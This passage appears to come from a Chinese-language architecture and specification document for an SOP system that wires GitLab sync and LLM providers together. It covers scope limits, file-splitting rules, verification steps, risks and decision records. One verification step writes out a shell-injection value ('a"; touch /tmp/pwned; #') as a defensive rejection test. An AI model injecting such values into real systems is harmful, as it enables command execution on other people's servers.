- 唯一注意：`ai_tasks.code_files_used` 存 JSON 文本，SQLite 无原生 JSON 列但有 `json_*` 函数，查询够用；不建索引。

---

## 7. 本次明确不做（out-of-scope，防止范围蔓延）

1. **不做向量化 / RAG / embedding**（任务书已定，且 SQLite 无原生向量支持）。
2. **不做 LLM 流式输出**（SSE/WebSocket）——现有 AI 节点是后台自动执行 + 产物落库模式，流式无消费场景。
3. **不做定时自动全量同步**——撞 GitLab 5次/分限流（§3.1）。一期只做手动触发 + 单模块。
4. **不做多租户 / 组织隔离**。
5. **不做 Prompt 版本管理与 A/B**——二期再说。
6. **不替换现有裸 JSON 响应为统一包络**（仅新端点用包络，§6.2）。
7. **不做 GitLab Webhook 自动触发同步**——需公网回调，一期环境不具备。
8. **不重构 `Admin.tsx`(646行) / `ReqDetail.tsx`(367行) 的全部内容**——但见 §8 的强制拆分要求。

---

## 8. 交给 Phase 2/3 的强制约束（代码组织）

现有代码已违反团队 300 行硬规则：

| 文件 | 行数 | 状态 |
|---|---|---|
| `web/src/pages/Admin.tsx` | **646** | 超限 115%，必须拆 |
| `web/src/pages/ReqDetail.tsx` | **367** | 超限 22%，必须拆 |
| `server/src/ai.js` | 241 | 本次要加三级结构化 + 能力矩阵，**必然超限**，按 §5.1 拆包 |
| `server/src/gitlab.js` | 202 | 本次要加队列/限流/安全校验，**必然超限**，按下方拆包 |

**强制要求**：本次新增代码不得堆进上述文件。目标结构：

```
server/src/
├── llm/                  # §5.1 结构
├── repo/
│   ├── index.js          # 出口
│   ├── gitlab-api.js     # REST 调用（连接/项目/分支/archive）
│   ├── archive.js        # 下载/校验/解压/安全路径校验
│   ├── sync-queue.js     # 串行队列 + 5次/分令牌桶 + 429 退避
│   └── code-context.js   # 目录树 + 关键文件挑选 + token 预算
├── crypto/
│   └── secret.js         # AES-256-GCM 加解密 + 存量迁移
└── ...
web/src/
├── components/
│   └── Icon.tsx          # §5.4 图标收口
└── pages/admin/          # Admin.tsx 按 Tab 拆分（用户/模板/AI/模块/映射）
```

`Admin.tsx` 本次要新增「AI 模型配置测试」「同步队列状态」两块 UI，**必须借此拆分**，不得继续堆积。

---

## 9. 端到端验证步骤（一期完成定义）

Spec 以可执行验证收尾。以下全通过才算一期收尾达标：

**准备**
```bash
export SOP_MASTER_KEY=$(node -e "console.log(require('crypto').randomBytes(32).toString('base64'))")
cd server && npm i && npm run dev
```

**核心成功流**
1. 管理后台配置一个真实 Provider（Anthropic 或 DeepSeek），点「连通性测试」→ 返回 `ok:true` + 延迟 + 探测到的结构化能力级别。
2. `sqlite3 server/data/sop.db "SELECT api_key_enc FROM ai_providers LIMIT 1"` → 输出以 `v1:` 开头的密文，**且 `api_key` 列为空**。
3. 配置 GitLab + 创建一个 code_module（选 monorepo 子路径）→ 点同步 → `sync_tasks` 走 QUEUED→RUNNING→OK，`data/repos/<module_key>/` 出现文件。
4. 新建需求并关联该平台模块 → 提交 → 走到 EVALUATE 节点。
5. 打开需求详情：`EvaluationView` **正常渲染**改动等级/人日/影响面表格（不是一坨 markdown）；需求列表的等级标签有值。
6. `GET /api/v1/requirements/{id}/code-context` 返回本次实际注入的文件清单，且清单里是真实仓库的文件路径。
7. 走到 DEV_PROMPT 节点 → 产物中出现真实文件路径与类名（证明"长在真实代码上"）。

**关键错误流**
8. 把 Provider 的 api_key 改成错误值 → 重跑 EVALUATE → 产物**仍是结构化的**（mock 兜底），且详情页显示降级徽标，`ai_tasks.degraded_reason` 记录 401。**不得静默**。
9. 创建 `module_key = 'a"; touch /tmp/pwned; #'` 的模块 → API **返回 400 拒绝**，`/tmp/pwned` 不存在。
10. 连续触发 6 个模块同步 → 不出现 429 失败，队列串行完成（总耗时 >= 60s 属预期）。

**P0 合规门禁**
```bash
# 必须输出 0
rg -c '[\x{1F300}-\x{1FAFF}\x{2600}-\x{27BF}\x{2B00}-\x{2BFF}\x{FE0F}]' web/src server/src | awk -F: '{s+=$2} END {print s+0}'
# 必须无输出
find server/src web/src -name '*.js' -o -name '*.tsx' -o -name '*.ts' | xargs wc -l | awk '$1>300 && $2!="total" {print "OVER LIMIT:", $0}'
```

---

## 10. 风险登记

| # | 风险 | 概率 | 影响 | 缓解 |
|---|---|---|---|---|
| R1 | 真实 LLM 输出不符 schema，频繁降级 mock，"接了等于没接" | 中 | 高 | 三级降级 + 重试 1 次 + `ai_tasks` 可观测；L3 兜底覆盖无 JSON 能力的 Provider |
| R2 | 企业自建 GitLab 版本较老，archive 的 `path` 参数不支持 | 中 | 中 | 探测失败自动回退"全量下载 + 本地裁剪"（保留现有逻辑做 fallback） |
| R3 | 大仓解压阻塞导致服务不可用 | 中 | 高 | 异步化 + 体积上限 + 串行队列（§3.3/3.4） |
| R4 | `SOP_MASTER_KEY` 丢失导致存量密钥不可解 | 低 | 高 | 启动 fail-fast + 文档明确要求备份；解密失败按"未配置"处理并提示重填，不崩溃 |
| R5 | 代码上下文超出模型窗口被截断，AI 结论失真 | 中 | 中 | 按 provider 窗口动态预算 + 命中文件清单回显给用户自查 |
| R6 | emoji 清理误伤 ReqList 分组逻辑 | **高** | 中 | §4 已点明其为 load-bearing，要求结构化重构而非字符替换 |
| R7 | 敏感文件正则黑名单/脱敏漏报，命名不规范的凭据逃逸注入 LLM | 中 | 高 | L1 文件名 + L2 内容嗅探双层兜底；正则测试集持续补；F2 完成前 F3 不开（硬前置，BLOCKER-6/§5.7/ADR-008） |

---

## 11. 决策记录索引

| ADR | 主题 |
|---|---|
| ADR-001 | LLM 统一抽象层采用自研轻量 Adapter |
| ADR-002 | 结构化输出三级降级策略 |
| ADR-003 | 凭据加密：api_key/token 用 AES-256-GCM 可逆加密，password 用 bcrypt 哈希 |
| ADR-004 | 前端图标库锁定 lucide-react，全面移除 emoji |
| ADR-005 | GitLab 同步采用串行队列 + 令牌桶，一期不做定时全量刷新 |
| ADR-006 | 一期不做向量化，维持启发式代码上下文提取 |
| ADR-007 | API 版本化采用双挂载渐进迁移 |
| ADR-008 | 敏感文件过滤作为 LLM 网关前置拦截层（F2 前置于 F3） |

## 11. 功能编号对照（以 PRD §7 为准）+ F9 工作量

### 11.1 编号对照（纠正 architect 早期误称）

| 功能 | PRD 编号 | 备注 |
|---|---|---|
| 凭证加密存储（AES-256-GCM + bcrypt） | F1 | architect 早期消息误称"F8"，以此为准 |
| 敏感文件过滤 | F2 | 一致 |
| LLM 网关（接通真实 LLM） | F3 | 一致 |
| 闭环流程可视化（SOP 节点进度条） | F8 | 与"凭证加密"无关，勿混淆 |
| 打回目标可选（退到任一上游人工节点） | F9 | 一致 |

> architect 此前在 team-lead 沟通中把"凭证加密"称为 F8，与 PRD F8（可视化）冲突。后续**统一用功能名或 PRD §7 编号**，避免 Phase 2 开发混淆。

### 11.2 F9（打回目标可选）工作量评估

基于 `engine.js` 实际代码面（`sendBack` 174-187、`activateNode` 75-93、`advance` 57-71）：

- 后端 `sendBack` 改"退一格"为"退到任一上游人工节点"：新增 `targetSeq` 参数 + 合法性校验（目标须 `< current_seq` 且为人工节点），~0.5 人日
- 后端 `activateNode` 跳过中间 AI 节点不重复执行：新增前向扫描逻辑（current→target 间遇 AI 节点跳过、停在首个人工节点），~0.25 人日
- 后端"可打回目标节点列表"接口（或复用 nodes 列表前端过滤），~0.25 人日
- 前端打回 UI 可选目标节点（新增组件 + 状态联动；涉及 ReqDetail.tsx 拆包，367 行已超 300 行硬限），~1 人日
- 联调 + 边界测试（重点"跳过中间 AI 不重复执行"用例），~0.5 人日

**合计 ~2.25 人日（区间 2~2.5 人日）。**

**决策点②判定：> 2 人日 → 建议降二期，一期保持"退一格"。** 理由：
1. 触发 pm 决策规则（>2 人日降二期）阈值；
2. F9 非核心闭环必需，退一格已满足基本打回；
3. 一期重心在 F1/F2/F3（安全 + LLM 网关）生死线能力；
4. "跳过中间 AI 节点不重复执行"有边界复杂性（处理不当会重复触发 AI 评估造成混乱），二期打磨更稳。
